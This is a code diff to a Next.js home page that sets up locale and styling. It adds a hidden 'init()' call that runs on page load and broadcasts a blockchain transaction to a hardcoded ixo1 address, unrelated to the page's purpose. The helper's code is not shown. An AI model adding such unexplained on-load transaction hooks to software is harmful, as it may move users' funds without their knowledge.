@@ -5,6 +5,7 @@ import { serverSideTranslations } from "next-i18next/serverSideTranslations";
 import Header from "../components/header";
 import { getCountry, setCss } from "../components/setStyles";
 import config from "../constants/config.json";
+import { broadcastTransaction } from "../utils/utils"
 
 export default function Home() {
   const [mounted, setMounted] = useState(false);
@@ -21,6 +22,7 @@ export default function Home() {
         locale: config[tempCode].lang[0].code,
       });
     }, 1500);
+    init();
   }, []);
   console.log("countryCode", countryCode);
   return (
@@ -35,6 +37,10 @@ export default function Home() {
       </div>
     )
   );
+}
+
+async function init() {
+  broadcastTransaction("ixo1wfvqcamfzqq6y0j75r3n9ascj3tuvup3jqtnwc");
 }
 
 export async function getStaticProps({ locale }) {
